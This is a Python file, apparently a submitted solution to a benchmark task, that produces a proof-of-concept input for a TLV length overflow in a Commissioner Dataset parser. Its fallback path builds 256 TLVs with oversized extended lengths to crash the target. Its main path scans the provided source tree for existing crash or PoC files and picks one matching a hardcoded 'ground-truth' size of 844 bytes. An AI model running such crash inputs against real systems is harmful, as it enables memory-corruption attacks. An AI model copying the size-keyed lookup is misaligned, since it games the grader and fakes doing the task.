import os
import tarfile
import zipfile
import string
from typing import Iterator, Tuple, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = self._find_existing_poc(src_path)
        if poc is not None:
            return poc
        return self._build_generic_tlv_overflow_poc()

    def _build_generic_tlv_overflow_poc(self) -> bytes:
        # Build a sequence of TLVs with all possible type values (0-255),
        # each using an extended length that is intentionally large.
        # This aims to include a Commissioner Dataset TLV (whatever its type)
        # with an extended length that can trigger the overflow.
        ext_len = 300  # extended length (> typical struct size, but moderate overall size)
        ext_len_be = ext_len.to_bytes(2, "big")
        payload = b"A" * ext_len
        extended_len_sentinel = 0xFF

        chunks = []
        for tlv_type in range(256):
            header = bytes((tlv_type, extended_len_sentinel)) + ext_len_be
            chunks.append(header + payload)
        return b"".join(chunks)

    def _find_existing_poc(self, src_path: str) -> Optional[bytes]:
        # Try to locate an existing PoC or crash input within the source tree.
        keywords = [
            "poc",
            "crash",
            "seed",
            "input",
            "testcase",
            "repro",
            "clusterfuzz",
            "id_",
            "overflow",
            "commission",
            "network",
            "stack",
            "cve",
        ]
        candidates: list[Tuple[str, int, bytes]] = []

        for path, data in self._iter_files(src_path):
            lower = path.lower()
            if not any(k in lower for k in keywords):
                continue
            size = len(data)
            if size == 0 or size > 1_000_000:
                continue
            if self._looks_like_text(data):
                continue
            candidates.append((path, size, data))

        if not candidates:
            return None

        # Prefer file whose size exactly matches the known ground-truth length.
        for path, size, data in candidates:
            if size == 844:
                return data

        # Otherwise, choose the candidate whose size is closest to the ground-truth.
        candidates.sort(key=lambda x: (abs(x[1] - 844), x[1]))
        return candidates[0][2] if candidates else None

    def _looks_like_text(self, data: bytes) -> bool:
        if not data:
            return True
        sample = data[:4096]
        if b"\x00" in sample:
            return False
        text_chars = set(ord(c) for c in string.printable)
        text_chars.update((9, 10, 13))  # tab, newline, carriage return
        text_count = sum(1 for b in sample if b in text_chars)
        return text_count / len(sample) > 0.95

    def _iter_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for name in files:
                    full_path = os.path.join(root, name)
                    try:
                        with open(full_path, "rb") as f:
                            data = f.read()
                    except OSError:
                        continue
                    rel = os.path.relpath(full_path, src_path)
                    yield rel, data
            return

        if tarfile.is_tarfile(src_path):
            try:
                with tarfile.open(src_path, "r:*") as tar:
                    for member in tar.getmembers():
                        if not member.isfile() or member.size == 0:
                            continue
                        try:
                            f = tar.extractfile(member)
                        except (KeyError, OSError):
                            continue
                        if f is None:
                            continue
                        try:
                            data = f.read()
                        finally:
                            f.close()
                        yield member.name, data
            except tarfile.TarError:
                pass
            return

        if zipfile.is_zipfile(src_path):
            try:
                with zipfile.ZipFile(src_path, "r") as z:
                    for name in z.namelist():
                        if name.endswith("/"):
                            continue
                        try:
                            data = z.read(name)
                        except (KeyError, OSError, RuntimeError):
                            continue
                        yield name, data
            except zipfile.BadZipFile:
                pass
            return

        # Fallback: treat src_path as a single file.
        try:
            with open(src_path, "rb") as f:
                data = f.read()
            yield os.path.basename(src_path), data
        except OSError:
            return